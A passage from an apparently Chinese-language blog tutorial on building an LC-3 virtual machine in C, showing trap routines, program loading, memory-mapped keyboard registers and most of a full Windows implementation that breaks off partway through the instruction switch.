<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span>* c=memory+reg[R_R0];<span class="comment">//memory内存首地址</span></span><br><span class="line">    <span class="keyword">while</span>(*c)&#123;<span class="comment">//c语言的字符串结尾会放一个0，ASCII的0来代表结束</span></span><br><span class="line">        putc((<span class="type">char</span>)*c,<span class="built_in">stdout</span>);<span class="comment">//stdout是标准输出流，这是一个地址，类似于之前汇编接触的演示区域</span></span><br><span class="line">        ++c;<span class="comment">//自增，加载下一个字符</span></span><br><span class="line">    &#125;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);<span class="comment">//该函数会将缓冲区中尚未输出的数据立即写入到文件中，并清空缓冲区。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="输入单个字符（Input-Character）"><a href="#输入单个字符（Input-Character）" class="headerlink" title="输入单个字符（Input Character）"></a>输入单个字符（Input Character）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    reg[R_R0] = (<span class="type">uint16_t</span>)getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="输出单个字符（Output-Character）"><a href="#输出单个字符（Output-Character）" class="headerlink" title="输出单个字符（Output Character）"></a>输出单个字符（Output Character）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    putc((<span class="type">char</span>)reg[R_R0], <span class="built_in">stdout</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="打印输入单个字符提示（Prompt-for-Input-Character）"><a href="#打印输入单个字符提示（Prompt-for-Input-Character）" class="headerlink" title="打印输入单个字符提示（Prompt for Input Character）"></a>打印输入单个字符提示（Prompt for Input Character）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter a character: &quot;</span>);</span><br><span class="line">    <span class="type">char</span> c = getchar();</span><br><span class="line">    putc(c, <span class="built_in">stdout</span>);</span><br><span class="line">    reg[R_R0] = (<span class="type">uint16_t</span>)c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="输出字符串（Output-String）"><a href="#输出字符串（Output-String）" class="headerlink" title="输出字符串（Output String）"></a>输出字符串（Output String）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">     <span class="type">uint16_t</span>* c = memory + reg[R_R0];</span><br><span class="line">    <span class="keyword">while</span> (*c) &#123;</span><br><span class="line">        <span class="type">char</span> char1 = (*c) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        putc(char1, <span class="built_in">stdout</span>);</span><br><span class="line">        <span class="type">char</span> char2 = (*c) &gt;&gt; <span class="number">8</span>;<span class="comment">//这里细节注意   字符mzy在内存中是 zm ’0‘y因为寻址是16位的两个字节为一组，要想正常打印我们就要将顺序颠倒一下。</span></span><br><span class="line">        <span class="keyword">if</span> (char2) putc(char2, <span class="built_in">stdout</span>);</span><br><span class="line">        ++c;</span><br><span class="line">    &#125;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="暂停程序执行（Halt-Program）"><a href="#暂停程序执行（Halt-Program）" class="headerlink" title="暂停程序执行（Halt Program）"></a>暂停程序执行（Halt Program）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;HALT&quot;</span>);<span class="comment">//在终端上显示HALT</span></span><br><span class="line">    fflush(<span class="built_in">stdout</span>);<span class="comment">//立即显示</span></span><br><span class="line">    running = <span class="number">0</span>;<span class="comment">//置零，用于程序的判断</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="加载程序"><a href="#加载程序" class="headerlink" title="加载程序"></a>加载程序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">read_image_file</span><span class="params">(FILE* file)</span> &#123;</span><br><span class="line">    <span class="type">uint16_t</span> origin; <span class="comment">/* the origin tells us where in memory to place the image */</span></span><br><span class="line">    fread(&amp;origin, <span class="keyword">sizeof</span>(origin), <span class="number">1</span>, file);<span class="comment">//用于打开和读取文件</span></span><br><span class="line">    origin = swap16(origin);<span class="comment">//变换字节序，将我们物理机产生的小端数据转换为LC-3的大端</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we know the maximum file size so we only need one fread */</span></span><br><span class="line">    <span class="type">uint16_t</span> max_read = UINT16_MAX - origin;<span class="comment">//计算出可以读取的最大字节数</span></span><br><span class="line">    <span class="type">uint16_t</span>* p = memory + origin;<span class="comment">//指针p指向程序入口</span></span><br><span class="line">    <span class="type">size_t</span> read = fread(p, <span class="keyword">sizeof</span>(<span class="type">uint16_t</span>), max_read, file);</span><br><span class="line"><span class="comment">//从输入流file中读取最多max_read个元素，并将他们存储在以p为起始地址的内存位置中，返回值是读取的元素数存储在read中。</span></span><br><span class="line">    <span class="comment">/* swap to little endian */</span></span><br><span class="line">    <span class="keyword">while</span> (read-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        *p = swap16(*p);</span><br><span class="line">        ++p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">swap16</span><span class="params">(<span class="type">uint16_t</span> x)</span> &#123;<span class="comment">//变换大小端</span></span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; <span class="number">8</span>) | (x &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对加载程序进行封装，经过封装之后，接受一个文件路径字符串作为参数，这样更加方便。搜嘎，原来这就是封装的奥妙。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">read_image</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* image_path)</span> &#123;</span><br><span class="line">    FILE* file = fopen(image_path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!file) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;;</span><br><span class="line">    read_image_file(file);</span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内存映射寄存器"><a href="#内存映射寄存器" class="headerlink" title="内存映射寄存器"></a>内存映射寄存器</h2><p>一些寄存器不能通过常规的寄存器表进行访问，而内存中储存了特殊的地址，可以通过读写相应的内存地址而达到读写这些寄存器的目的。</p>
<p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230520004211.png"></p>
<p>是不是和端口有点关系。</p>
<ul>
<li><code>KBSR</code>：键盘状态寄存器（keyboard status register），表示是否有键按下</li>
<li><code>KBDR</code>：键盘数据寄存器（keyboard data register），表示哪个键按下了</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    MR_KBSR = <span class="number">0xFE00</span>, <span class="comment">/* keyboard status */</span></span><br><span class="line">    MR_KBDR = <span class="number">0xFE02</span>  <span class="comment">/* keyboard data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>访问方法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mem_write</span><span class="params">(<span class="type">uint16_t</span> address, <span class="type">uint16_t</span> val)</span> &#123;</span><br><span class="line">    memory[address] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">mem_read</span><span class="params">(<span class="type">uint16_t</span> address)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (address == MR_KBSR) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check_key()) &#123;</span><br><span class="line">            memory[MR_KBSR] = (<span class="number">1</span> &lt;&lt; <span class="number">15</span>);</span><br><span class="line">            memory[MR_KBDR] = getchar();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            memory[MR_KBSR] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memory[address];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="完整的虚拟机"><a href="#完整的虚拟机" class="headerlink" title="完整的虚拟机"></a>完整的虚拟机</h1><p>运行时需要传参    .&#x2F;LC-3\ VM.exe 2048.obj 就可以玩2048了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="comment">/* windows only */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span>  <span class="comment">// _kbhit</span></span></span><br><span class="line"><span class="type">uint16_t</span> memory[UINT16_MAX];<span class="comment">//每个存储单元存储一个16位的值</span></span><br><span class="line"><span class="comment">//&#123;Memory Mapped Registers&#125;</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">check_key</span><span class="params">()</span>;</span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">mem_read</span><span class="params">(<span class="type">uint16_t</span> address)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mem_write</span><span class="params">(<span class="type">uint16_t</span> address, <span class="type">uint16_t</span> val)</span>;</span><br><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    MR_KBSR = <span class="number">0xFE00</span>, <span class="comment">/* keyboard status */</span></span><br><span class="line">    MR_KBDR = <span class="number">0xFE02</span>  <span class="comment">/* keyboard data */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mem_write</span><span class="params">(<span class="type">uint16_t</span> address, <span class="type">uint16_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    memory[address] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">mem_read</span><span class="params">(<span class="type">uint16_t</span> address)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (address == MR_KBSR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (check_key())</span><br><span class="line">        &#123;</span><br><span class="line">            memory[MR_KBSR] = (<span class="number">1</span> &lt;&lt; <span class="number">15</span>);</span><br><span class="line">            memory[MR_KBDR] = getchar();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            memory[MR_KBSR] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memory[address];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//陷阱代码</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TRAP_GETC = <span class="number">0x20</span>,  <span class="comment">/* get character from keyboard, not echoed onto the terminal */</span></span><br><span class="line">    TRAP_OUT = <span class="number">0x21</span>,   <span class="comment">/* output a character */</span></span><br><span class="line">    TRAP_PUTS = <span class="number">0x22</span>,  <span class="comment">/* output a word string */</span></span><br><span class="line">    TRAP_IN = <span class="number">0x23</span>,    <span class="comment">/* get character from keyboard, echoed onto the terminal */</span></span><br><span class="line">    TRAP_PUTSP = <span class="number">0x24</span>, <span class="comment">/* output a byte string */</span></span><br><span class="line">    TRAP_HALT = <span class="number">0x25</span>   <span class="comment">/* halt the program */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    R_R0 = <span class="number">0</span>,</span><br><span class="line">    R_R1,</span><br><span class="line">    R_R2,</span><br><span class="line">    R_R3,</span><br><span class="line">    R_R4,</span><br><span class="line">    R_R5,</span><br><span class="line">    R_R6,</span><br><span class="line">    R_R7,</span><br><span class="line">    R_PC, <span class="comment">/* program counter */</span></span><br><span class="line">    R_COND,</span><br><span class="line">    R_COUNT</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint16_t</span> reg[R_COUNT];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    OP_BR = <span class="number">0</span>, <span class="comment">/* branch */</span></span><br><span class="line">    OP_ADD,    <span class="comment">/* add  */</span></span><br><span class="line">    OP_LD,     <span class="comment">/* load */</span></span><br><span class="line">    OP_ST,     <span class="comment">/* store */</span></span><br><span class="line">    OP_JSR,    <span class="comment">/* jump register */</span></span><br><span class="line">    OP_AND,    <span class="comment">/* bitwise and */</span></span><br><span class="line">    OP_LDR,    <span class="comment">/* load register */</span></span><br><span class="line">    OP_STR,    <span class="comment">/* store register */</span></span><br><span class="line">    OP_RTI,    <span class="comment">/* unused */</span></span><br><span class="line">    OP_NOT,    <span class="comment">/* bitwise not */</span></span><br><span class="line">    OP_LDI,    <span class="comment">/* load indirect */</span></span><br><span class="line">    OP_STI,    <span class="comment">/* store indirect */</span></span><br><span class="line">    OP_JMP,    <span class="comment">/* jump */</span></span><br><span class="line">    OP_RES,    <span class="comment">/* reserved (unused) */</span></span><br><span class="line">    OP_LEA,    <span class="comment">/* load effective address */</span></span><br><span class="line">    OP_TRAP    <span class="comment">/* execute trap */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">HANDLE hStdin = INVALID_HANDLE_VALUE;</span><br><span class="line">DWORD fdwMode, fdwOldMode;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">disable_input_buffering</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    hStdin = GetStdHandle(STD_INPUT_HANDLE);</span><br><span class="line">    GetConsoleMode(hStdin, &amp;fdwOldMode); <span class="comment">/* save old mode */</span></span><br><span class="line">    fdwMode = fdwOldMode</span><br><span class="line">        ^ ENABLE_ECHO_INPUT  <span class="comment">/* no input echo */</span></span><br><span class="line">        ^ ENABLE_LINE_INPUT; <span class="comment">/* return when one or</span></span><br><span class="line"><span class="comment">                                more characters are available */</span></span><br><span class="line">    SetConsoleMode(hStdin, fdwMode); <span class="comment">/* set new mode */</span></span><br><span class="line">    FlushConsoleInputBuffer(hStdin); <span class="comment">/* clear buffer */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">restore_input_buffering</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    SetConsoleMode(hStdin, fdwOldMode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">check_key</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> WaitForSingleObject(hStdin, <span class="number">1000</span>) == WAIT_OBJECT_0 &amp;&amp; _kbhit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">handle_interrupt</span><span class="params">(<span class="type">int</span> signal)</span></span><br><span class="line">&#123;</span><br><span class="line">    restore_input_buffering();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">sign_extend</span><span class="params">(<span class="type">uint16_t</span> x, <span class="type">int</span> bit_count)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((x &gt;&gt; (bit_count - <span class="number">1</span>)) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">        x |= (<span class="number">0xFFFF</span> &lt;&lt; bit_count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">swap16</span><span class="params">(<span class="type">uint16_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; <span class="number">8</span>) | (x &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    FL_POS = <span class="number">1</span> &lt;&lt; <span class="number">0</span>, <span class="comment">/* P */</span></span><br><span class="line">    FL_ZRO = <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="comment">/* Z */</span></span><br><span class="line">    FL_NEG = <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="comment">/* N */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">update_flags</span><span class="params">(<span class="type">uint16_t</span> r)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (reg[r] == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_COND] = FL_ZRO;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (reg[r] &gt;&gt; <span class="number">15</span>) <span class="comment">/* a 1 in the left-most bit indicates negative */</span></span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_COND] = FL_NEG;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_COND] = FL_POS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_image_file</span><span class="params">(FILE* file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* the origin tells us where in memory to place the image */</span></span><br><span class="line">    <span class="type">uint16_t</span> origin;</span><br><span class="line">    fread(&amp;origin, <span class="keyword">sizeof</span>(origin), <span class="number">1</span>, file);</span><br><span class="line">    origin = swap16(origin);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we know the maximum file size so we only need one fread */</span></span><br><span class="line">    <span class="type">uint16_t</span> max_read = UINT16_MAX - origin;</span><br><span class="line">    <span class="type">uint16_t</span>* p = memory + origin;</span><br><span class="line">    <span class="type">size_t</span> read = fread(p, <span class="keyword">sizeof</span>(<span class="type">uint16_t</span>), max_read, file);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* swap to little endian */</span></span><br><span class="line">    <span class="keyword">while</span> (read-- &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *p = swap16(*p);</span><br><span class="line">        ++p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">read_image</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* image_path)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* file = fopen(image_path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!file) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;;</span><br><span class="line">    read_image_file(file);</span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* show usage string */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;lc3 [image-file1] ...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; argc; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!read_image(argv[j]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;failed to load image: %s\n&quot;</span>, argv[j]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    signal(SIGINT, handle_interrupt);</span><br><span class="line">    disable_input_buffering();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* since exactly one condition flag should be set at any given time, set the Z flag */</span></span><br><span class="line">    reg[R_COND] = FL_ZRO;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* set the PC to starting position */</span></span><br><span class="line">    <span class="comment">/* 0x3000 is the default */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> PC_START = <span class="number">0x3000</span> &#125;;</span><br><span class="line">    reg[R_PC] = PC_START;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> running = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (running)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* FETCH */</span></span><br><span class="line">        <span class="type">uint16_t</span> instr = mem_read(reg[R_PC]++);</span><br><span class="line">        <span class="type">uint16_t</span> op = instr &gt;&gt; <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (op) &#123;      <span class="comment">//步骤三、四</span></span><br><span class="line">        <span class="keyword">case</span> OP_ADD: &#123;</span><br><span class="line">            <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;<span class="comment">//只看9到11位，即目的寄存器</span></span><br><span class="line">            <span class="type">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;<span class="comment">//第一个参数 寄存器编号</span></span><br><span class="line">            <span class="type">uint16_t</span> imm_flag = (instr &gt;&gt; <span class="number">5</span>) &amp; <span class="number">1</span>;<span class="comment">//查看第五位从而确定最后一个参数是寄存器还是立即数</span></span><br><span class="line">            <span class="keyword">if</span> (imm_flag) &#123;<span class="comment">//立即数模式</span></span><br><span class="line">                <span class="type">uint16_t</span> imm5 = sign_extend(instr &amp; <span class="number">0x1f</span>, <span class="number">5</span>);<span class="comment">//短于16bit的值进行符号扩展</span></span><br><span class="line">                reg[r0] = reg[r1] + imm5;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;       <span class="comment">//寄存器模式</span></span><br><span class="line">                <span class="type">uint16_t</span> r2 = instr &amp; <span class="number">0x7</span>;</span><br><span class="line">                reg[r0] = reg[r1] + reg[r2];</span><br><span class="line">            &#125;</span><br><span class="line">            update_flags(r0);<span class="comment">//查看计算的结果并更新标志寄存器</span></span><br><span class="line">        &#125; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_AND: &#123;</span><br><span class="line">            <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;<span class="comment">//目的寄存器</span></span><br><span class="line">            <span class="type">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;<span class="comment">//寄存器编号</span></span><br><span class="line">            <span class="type">uint16_t</span> imm_flag = (instr &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1</span>;<span class="comment">//确定模式</span></span><br><span class="line">            <span class="keyword">if</span> (imm_flag) &#123;</span><br><span class="line">                <span class="type">uint16_t</span> imm5 = sign_extend(instr &amp; <span class="number">0x1f</span>, <span class="number">5</span>);</span><br><span class="line">                reg[r0] = reg[r1] &amp; imm5;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">uint16_t</span> r2 = instr &amp; <span class="number">0x7</span>;</span><br><span class="line">                reg[r0] = reg[r1] &amp; reg[r2];</span><br><span class="line">            &#125;</span><br><span class="line">            update_flags(r0);</span><br><span class="line">        &#125; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_NOT: &#123;</span><br><span class="line">            <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;<span class="comment">//目的寄存器</span></span><br><span class="line">            <span class="type">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;<span class="comment">//寄存器编号</span></span><br><span class="line">            reg[r0] = ~reg[r1];</span><br><span class="line">            update_flags(r0);</span><br><span class="line">        &#125; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_BR: &#123;</span><br><span class="line">            <span class="type">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1ff</span>, <span class="number">9</span>);</span><br><span class="line">            <span class="type">uint16_t</span> cond_flag = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">            <span class="keyword">if</span> (cond_flag &amp; reg[R_COND]) &#123;</span><br><span class="line">                reg[R_PC] += pc_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_JMP: &#123;</span><br><span class="line">            <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">            reg[R_PC] = reg[r0];</span><br><span class="line">        &#125; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_JSR: &#123;</span><br><span class="line">            <span class="type">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">            <span class="type">uint16_t</span> long_pc_offset = sign_extend(instr &amp; <span class="number">0x7ff</span>, <span class="number">11</span>);</span><br><span class="line">            <span class="type">uint16_t</span> long_flag = (instr &gt;&gt; <span class="number">11</span>) &amp; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            reg[R_R7] = reg[R_PC];</span><br><span class="line">            <span class="keyword">if</span> (long_flag) &#123;</span><br><span class="line">                reg[R_PC] += long_pc_offset;  <span class="comment">/* JSR */</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                reg[R_PC] = reg[r1]; <span class="comment">/* JSRR */</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;<span class="comment">//终止包含他的循环，并执行下一阶段。结束这次的switch</span></span><br><span class="line">        &#125; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_LD: &#123;</span><br><span class="line">            <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">            <span class="type">uint16_t</span> pc_coffset = sign_extend(instr &amp; <span class="number">0x1ff</span>, <span class="number">9</span>);</span><br><span class="line">            reg[r0] = mem_read(reg[R_PC] + pc_coffset);</span><br><span class="line">            update_flags(r0);</span><br><span class="line">        &#125; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_LDI: &#123;</span><br><span class="line">            <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;<span class="comment">//取目的寄存器</span></span><br><span class="line">            <span class="type">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1ff</span>, <span class="number">9</span>);<span class="comment">//符号扩展，第一个参数是该数的位，第二个参数描述长度</span></span><br><span class="line">            reg[r0] = mem_read(mem_read(reg[R_PC] + pc_offset));<span class="comment">//读取指定内存地址处的值加载入目的寄存器</span></span><br><span class="line">            update_flags(r0);<span class="comment">//更新标志寄存器</span></span><br><span class="line">        &#125; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_LDR: &#123;</span><br><span class="line">            <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">            <span class="type">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">            <span class="type">uint16_t</span> offset = sign_extend(instr &amp; <span class="number">0x3F</span>, <span class="number">6</span>);</span><br><span class="line">            reg[r0] = mem_read(reg[r1] + offset);</span><br><span class="line">            update_flags(r0);</span><br><span class="line">        &#125; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_LEA: &#123;</span><br><span class="line">            <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">            <span class="type">uint16_t</span> pc_coffset = sign_extend(instr &amp; <span class="number">0x1ff</span>, <span class="number">9</span>);</span><br><span class="line">            reg[r0] = reg[R_PC] + pc_coffset;</span><br><span class="line">            update_flags(r0);</span><br><span class="line">        &#125; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> 